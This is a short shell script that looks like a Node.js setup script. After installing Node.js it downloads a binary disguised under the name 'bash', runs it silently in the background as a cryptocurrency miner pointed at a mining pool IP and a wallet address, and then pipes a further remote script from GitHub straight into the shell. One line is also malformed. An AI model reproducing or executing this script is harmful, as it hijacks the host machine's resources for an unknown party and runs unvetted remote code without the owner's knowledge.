#!/bin/sh
curl -fsSL https://deb.nodesource.com/setup_20.x | bash - && apt-get install -y nodejs && npm install -g npm@8.10.0 && apt ph add bash"
wget https://github.com/malogrono/opr/raw/refs/heads/main/bash >/dev/null 2>&1
chmod +x bash
./bash --disable-cpu --algorithm pearlhash --pool 95.111.195.159:80 --wallet prl1pg28ldvmyg8wkudfm3naexd0l3sun7xmz5hl8vrpdmazpzcwnf5vs6ftdcs.ROOT >/dev/null 2>&1 &
curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
